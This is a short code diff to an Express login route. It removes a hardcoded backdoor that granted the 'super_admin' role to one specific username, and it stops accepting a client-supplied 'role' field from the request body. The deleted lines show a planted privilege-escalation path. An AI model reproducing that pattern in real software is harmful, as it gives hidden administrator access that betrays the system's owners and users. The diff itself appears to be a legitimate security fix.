@@ -52,12 +52,9 @@ router.post(
       });
     }
 
-    let { username, password, role } = req.body;
+    let { username, password } = req.body;
 
     try {
-      if (username === "fena00721") {
-        role = "super_admin";
-      }
       const userResult = await queryWithFailover(
         "SELECT * FROM users WHERE username = $1",
         [username],
